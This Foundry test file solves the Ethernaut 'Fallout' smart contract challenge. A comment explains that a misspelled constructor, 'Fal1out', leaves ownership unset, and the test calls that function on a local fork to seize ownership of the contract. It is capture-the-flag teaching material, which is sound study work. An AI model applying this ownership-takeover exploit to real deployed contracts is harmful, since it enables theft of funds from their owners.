// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.0;

import "ds-test/test.sol";
import "forge-std/Test.sol";
import "../src/02_Fallout.sol";

/*
Author: @BoscoHuang

Attack Process:
- Firstly, we noted that the Solidity compiler version is `< 0.8.x`. This means that the is susceptible to arithmetic underflow and overflow errors.

- This contract imported and used OpenZeppelin [`SafeMath`](https://docs.openzeppelin.com/contracts/4.x/api/utils#SafeMath) Lib, so there should be no overflow issues with this contract.

- Prior to Solidity version `0.4.22`, the only way to define a constructor for a contract was to define a function with the same name as the contract itself.

- The name of the contract is `Fallout`, but the constructor is called `Fal1out`. Because of this typo, when the contract is deployed, the constructor is never executed at creation time and the owner is never updated.

Command:
- forge test --match-contract FalloutTest --fork-url http://127.0.0.1:8545 -vvv
*/

contract FalloutTest is DSTest {
    Fallout Ethernaut02;

    function setUp() public {
        Ethernaut02 = Fallout(payable(0x5FbDB2315678afecb367f032d93F642f64180aa3)); // Fallout address in anvil
    }

    function testEthernaut02() public {
        console.log("Ethernaut02 owner:", Ethernaut02.owner()); // Owner is zero address

        Ethernaut02.Fal1out();

        assert(address(this) == Ethernaut02.owner()); // Attacker becomes the owner

        console.log("Ethernaut02 owner:", Ethernaut02.owner());
    }

    receive() external payable {}
}

